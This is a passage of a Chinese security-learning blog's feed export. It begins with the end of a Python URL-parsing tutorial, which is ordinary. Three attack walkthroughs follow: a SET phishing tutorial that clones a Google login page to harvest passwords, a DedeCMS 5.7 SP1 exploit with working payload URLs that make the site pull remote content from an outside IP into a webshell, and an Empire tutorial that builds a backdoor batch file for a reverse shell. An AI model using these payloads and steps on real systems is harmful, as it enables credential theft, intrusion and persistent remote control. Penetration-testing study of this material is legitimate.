src="https://img-blog.csdnimg.cn/20200416202131441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这个方法非常常用。有时为了更加方便地构造参数，我们会事先用字典来表示。要转化为URL的参数时，只要调用该方法即可。</p><h2 id="parse-qs"><a href="#parse-qs" class="headerlink" title="parse_qs()"></a>parse_qs()</h2><p>有了序列化，必然就有反序列化。如果我们有一串GET请求参数，利用<code>parse_qs()方法</code>，就可以将它转回字典，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line">query=<span class="string">'name=germey&amp;age=22'</span></span><br><span class="line">print(parse_qs(query))</span><br></pre></td></tr></table></figure><p>可以看到，这就就成功转回字典类型了。<br><img src="https://img-blog.csdnimg.cn/20200416202817722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="parse-qsl"><a href="#parse-qsl" class="headerlink" title="parse_qsl()"></a>parse_qsl()</h2><p>另外，还有一个<code>parse_qsl()方法</code>，它用于将参数转化为元组组成的列表，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qsl</span><br><span class="line">query=<span class="string">'name=germey&amp;age=22'</span></span><br><span class="line">print(parse_qsl(query))</span><br></pre></td></tr></table></figure><p>可以看到，运行结果是一个列表，而列表中的每一个元素都是一个元组，元组的第一个内容是参数名，第二个内容是参数值。<br><img src="https://img-blog.csdnimg.cn/20200416203050862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="quote"><a href="#quote" class="headerlink" title="quote()"></a>quote()</h2><p>该方法可以将内容转化为<code>URL</code>编码的格式。<code>URL</code>中带有中文参数时，有时可能会导致乱码的问题，此时用这个方法可以将中文字符转化为<code>URL</code>编码，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">keyword=<span class="string">'壁纸'</span></span><br><span class="line">url=<span class="string">'https://baidu.com/s?wd='</span>+quote(keyword)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><p>这里我们声明了一个中文的搜索文字，然后用quote()方法对其进行URL编码，最后得到的结果如下：<br><img src="https://img-blog.csdnimg.cn/20200416203605471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="unquote"><a href="#unquote" class="headerlink" title="unquote()"></a>unquote()</h2><p>有了<code>quote()</code>方法，当然还有<code>unquote()</code>方法，它可以进行<code>URL</code>解码，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">'https://baidu.com/s?wd=%E5%A3%81%E7%BA%B8'</span></span><br><span class="line">print(unquote(url))</span><br></pre></td></tr></table></figure><p>这是上面得到的URL编码后的结果，这里利用，这里利用unquote()方法还原，结果如下：<br><img src="https://img-blog.csdnimg.cn/20200416204039361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)可以看到，利用unquote()方法可以方便地实现解码。<br>本节中，我们介绍了parse模块的一些常用URL处理方法。有了这些方法，我们就可以方便地实现URL的解析和构造，建议熟练掌握。</p>]]></content>
      
      
      <categories>
          
          <category> python3 网络爬虫开发实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基本库的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学攻击</title>
      <link href="/2020/04/18/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/"/>
      <url>/2020/04/18/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-社会工程学简介"><a href="#0x00-社会工程学简介" class="headerlink" title="0x00 社会工程学简介"></a>0x00 社会工程学简介</h2><p>社会工程学攻击主要利用人们的好奇心、信任、贪婪及一些愚蠢的错误，攻击人们自身的弱点。kali linux提供了一个社会工程学工具集set,可以用来实施社会工程学攻击。</p><a id="more"></a><h2 id="0x01-启动社会工程学工具包"><a href="#0x01-启动社会工程学工具包" class="headerlink" title="0x01 启动社会工程学工具包"></a>0x01 启动社会工程学工具包</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：  setoolkit</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200410210201446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输出的信息详细介绍了SET，该信息在第一次运行会显示。此时输入y，将显示如下信息，这里显示了社会工程学攻击的菜单，这时候选择工程学攻击类型，就可以实施攻击了。<br><img src="https://img-blog.csdnimg.cn/20200410210824984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-Web攻击向量"><a href="#0x02-Web攻击向量" class="headerlink" title="0x02 Web攻击向量"></a>0x02 Web攻击向量</h2><p>Web攻击向量会特意构造出一些对目标而言是可信且具有诱惑力的网页。当目标用户<br>访问该网页后，即可窃取目标用户的信息。社会工程学攻击工具包可以克隆出和实际运行<br>的可信站点外观完全一样的网页，这使得受害者认为他们正在浏览一个合法站点。</p><h2 id="具体操作步骤："><a href="#具体操作步骤：" class="headerlink" title="具体操作步骤："></a>具体操作步骤：</h2><p>首先启动工具并选择社会工程学攻击,执行命令如下：<br><img src="https://img-blog.csdnimg.cn/20200410211520502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200410211943808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时用户就可以选择对应的攻击类型，然后实施攻击。选择web攻击向量，所以选择2<br><img src="https://img-blog.csdnimg.cn/20200410212221690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">选择证书获取攻击方法，这里选择3<br><img src="https://img-blog.csdnimg.cn/20200410212327349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200410212537589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">以上输出显示了创建web站点的方式，我们可以根据自己的需要进行选择，这里为了方便，选择web模板，输入编号1，并且指定用户提交信息的ip地址，即攻击机kali的地址。<br><img src="https://img-blog.csdnimg.cn/20200410212916818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">以下信息提供了几个模板，这里选择google站点模板，选择编号2，</p><p><img src="https://img-blog.csdnimg.cn/20200410213300651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里提示用户，如果用户的目录结构依赖/var/www/html目录，可能需要复制/var/www/<br>下面的所有文件到/var/www/html文件夹中。此时，按回车键将显示如下信息:<br><img src="https://img-blog.csdnimg.cn/20200410213326378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">输出以上信息就说明成功发起了社会工程学攻击，这时候目标只要访问了克隆的站点进行登录，那么我们就会捕获到提交的账号密码了。<br><img src="https://img-blog.csdnimg.cn/20200410213735243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200410213902278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 社会工程学工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会工程学攻击获取目标帐号密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 5.7 sp1远程文件包含漏洞(CVE-2015-4553)</title>
      <link href="/2020/04/18/DedeCMS%205.7%20sp1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2015-4553)/"/>
      <url>/2020/04/18/DedeCMS%205.7%20sp1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2015-4553)/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-什么是文件包含漏洞？"><a href="#0x00-什么是文件包含漏洞？" class="headerlink" title="0x00 什么是文件包含漏洞？"></a>0x00 什么是文件包含漏洞？</h2><p><strong>文件包含漏洞</strong><br>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，<br>最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）<br>一句话来说就是：文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，<br>导致了文件包含漏洞的产生。</p><p>注：包含文件很有用，可以简化代码</p><p>文件包含分为本地和远程文件包含（需要<code>allow_url_include = On</code>）<br>本地文件包含LFI 远程文件包含 RFI</p><h2 id="0x01-函数解析"><a href="#0x01-函数解析" class="headerlink" title="0x01 函数解析"></a>0x01 函数解析</h2><p><strong>首先我们来了解4个函数（php）</strong></p><p><code>include</code>：使用include引用外部文件时，只有代码执行到include代码段时，<br>调用的外部文件才会被引用并读取，当引用的文件发生错误时，<br>系统只会给出个警告错误，而整个php文件会继续执行。</p><p><code>require</code>：在php文件被执行之前，php解析器会用被引用的文件的全部内容替换require语句，<br>然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p><p>使用<code>include_once</code>会在导入文件前先检测该文件是否在该页面的其他部分被引用过，<br>如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，<br>那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，<br>因为php不允许相同名称的函数被重复声明）</p><p><code>require_once</code>语句是<code>require</code>语句的延伸，他的功能与require语句基本一致，不同的是，在应用<code>require_once</code>时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用<code>require_once</code>语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p><h2 id="0x02-审计cms"><a href="#0x02-审计cms" class="headerlink" title="0x02 审计cms"></a>0x02 审计cms</h2><p><strong>版本：DedeCMS-V5.7-UTF8-SP1</strong><br><strong>存在漏洞：变量覆盖+远程包含=任意代码执行</strong><br><strong>审计工具：Seay源代码审计系统</strong></p><h2 id="0x03-正文"><a href="#0x03-正文" class="headerlink" title="0x03 正文"></a>0x03 正文</h2><p><strong>首先我们打开审计工具进行自动审计，尝试寻找可控制的输出点，然后发现了变量覆盖漏洞</strong><br><img src="https://img-blog.csdnimg.cn/20200330212545766.png" alt="在这里插入图片描述"><strong>点击文件，对这段代码进行分析。</strong><br><img src="https://img-blog.csdnimg.cn/20200330213435886.png" alt="在这里插入图片描述"><strong>分析：<code>foreach</code>这个函数是个循环，<code>array</code>它是数组函数，括号里面的很明显是个传参，把括号里的值赋给变量<code>$request</code>。接受<code>get、post、cookie</code>传参，把接受的三种传参进行键值分离<code>1=&gt;$get,2=&gt;$_post,3=&gt;$_cookie,</code>这里就能以三种传参方式进行变量覆盖。</strong></p><p><strong>然后接着往下看，发现了if语句，判断网站是否安装的条件，如果存在，那么就执行程序已运行安装，如果你确定要重新安装，请先从FTP中删除 <code>install/install_lock.txt！</code>。并退出脚本。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200330214720649.jpg" alt="在这里插入图片描述">然后继续往下看，调到最后几行（373）。对这段代码进行审计。<br><img src="https://img-blog.csdnimg.cn/20200330215036138.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">变量<code>$updateHost</code>拼接<code>dedecms/demodata.{$s_lang}.txt</code>成字符串，然后<code>file_get_contents</code>读取<code>demodata.{$s_lang}.txt</code>文件内容，最后写入<code>$install_demo_name</code>参数中再用fpen打开文件，这里指定参数w，打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。<br>有了上面的条件我们就可以拿webshell了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>首先我们要绕过前面的if条件，<img src="https://img-blog.csdnimg.cn/20200330222818658.jpg#pic_center" alt="在这里插入图片描述"><br>我们前面已知，fpen定义了参数w，若文件存在清空，不存在新建，于是就可以绕过了，执行下面的语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:?step=<span class="number">11</span>&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200330224814862.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">再次构造payload, install_demo_name改为要上传的路径,updateHost改为我们远程服务器的IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?step=<span class="number">11</span>&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../shell.php&amp;updateHost=http:<span class="comment">//47.96.124.100/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020033022494635.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">最后访问shell.php文件，成功拿下webshell<br><img src="https://img-blog.csdnimg.cn/20200330225034716.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Empire后渗透神器</title>
      <link href="/2020/04/18/Empire%E5%90%8E%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
      <url>/2020/04/18/Empire%E5%90%8E%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p>empire 是一个针对内网针对域控的一个渗透测试框架，和 msf 类似。生成的木马基于powershell，能够具有一定的免杀效果。</p><p>empire 包含三个部分，一个是 modules 即自身的一些模块，一个是 listernes 即监听类似 msf 的 exploit/multi/handler 模块，一个是 agents 即已经链接上的会话类似 msf 存的 session。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/EmpireProject/Empire.git</span></span><br><span class="line">cd /Empire/setup/</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p>进入empire目录，执行empire就可以启动了：./empire</p><p>启动测试：<br><img src="https://img-blog.csdnimg.cn/20200408205727966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x03-简单使用"><a href="#0x03-简单使用" class="headerlink" title="0x03 简单使用"></a>0x03 简单使用</h2><p>首先创建一个监听端口，然后把木马文件运行在目标主机。并且会反弹回来一个shell。这样我们就可以执行命令了。</p><p>可以使用攻击empire的攻击模块（modules ），usemodule 来使用模块，searchmodule用来搜索模块，不过我没怎么使用过，这里仅用于主机信息收集。</p><h2 id="0x04-创建监听"><a href="#0x04-创建监听" class="headerlink" title="0x04 创建监听"></a>0x04 创建监听</h2><p>使用listeners模块进行监听，进入后使用help查询监听命令，这里我们使用uselistener ，然后点击两次tab选择监听模式。这里我使用http。然后输入info查看需要设置信息。跟msf的show options有点相似</p><p><img src="https://img-blog.csdnimg.cn/20200408210625941.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408210851201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里需要设置一下Name（木马名字），Host（本地ip）和Port（监听端口），用set命令进行设置,用execute命令执行开启监听<br><img src="https://img-blog.csdnimg.cn/20200408211333916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后用back命令返回listeners模块，用list查看监听。同样也可以用kill  muma 查杀监听。<br><img src="https://img-blog.csdnimg.cn/20200408211624391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x05-生成后门文件"><a href="#0x05-生成后门文件" class="headerlink" title="0x05 生成后门文件"></a>0x05 生成后门文件</h2><p>在监听模块下选择命令usestager，并按两下tab查看后面类型。<br>multi 开头的是通用类，其他的对应的是不同的操作系统，我们这里选择windows的bat<br><img src="https://img-blog.csdnimg.cn/20200408212130261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 通过info命令查看需要设置参数，发现这里还需要输入刚刚设置的监听的名字，并用execute命令生成木马文件。<br><img src="https://img-blog.csdnimg.cn/20200408212907913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408213048982.png" alt="在这里插入图片描述"><br>生成的后门 /tmp/launcher.bat 放进目标主机运行，只时候我们就会获得反弹shell。这样我们就可以进行进一步操作了。<br><img src="https://img-blog.csdnimg.cn/20200408213339409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200408213405859.png" alt="在这里插入图片描述">且windows上的那个bat执行了一次自动会删除。我们back返回到empire主界面，进入agents管理会话</p><p><img src="https://img-blog.csdnimg.cn/20200408213529222.png" alt="在这里插入图片描述">我们直接使用interact命令连接管理会话。<br><img src="https://img-blog.csdnimg.cn/20200408213824783.png" alt="在这里插入图片描述"></p><p>执行一个sc命令查看屏幕截图，截图保存在/root/Empire/downloads/7FGU84AC/screenshot/<br><img src="https://img-blog.csdnimg.cn/20200408214008351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214144616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">也可以执行windows的cmd命令可以用 shell 加要执行的cmd命令：<br><img src="https://img-blog.csdnimg.cn/20200408214300861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214334732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x07-使用内置模块"><a href="#0x07-使用内置模块" class="headerlink" title="0x07 使用内置模块"></a>0x07 使用内置模块</h2><p>Empire提供了用于收集主机信息的模块。输人命令“usemodule situational_awareness/host/<br>winenum”,即可在看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适<br>配器信息，共享信息等，如下图所示：<br><img src="https://img-blog.csdnimg.cn/20200408214612276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/2020040821462159.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214630833.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214640903.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214656913.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214708211.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214717253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214727135.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200408214737546.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> kali工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Empire后渗透神器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞扫描器 - Appscan</title>
      <link href="/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/"/>
      <url>/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-AppScan-–-简介"><a href="#0x00-AppScan-–-简介" class="headerlink" title="0x00 AppScan – 简介"></a>0x00 AppScan – 简介</h2><p>  AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</p><p>　　Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。</p><pre><code>我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</code></pre><p>Web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备</p><h2 id="0x01-AppScan-–-安装"><a href="#0x01-AppScan-–-安装" class="headerlink" title="0x01 AppScan – 安装"></a>0x01 AppScan – 安装</h2><p>首先把文件拉进windows系统里，然后双击AppScan_Std_9.0.3.7_Eval_Win进行安装。<br><img src="https://img-blog.csdnimg.cn/20200404230632787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img 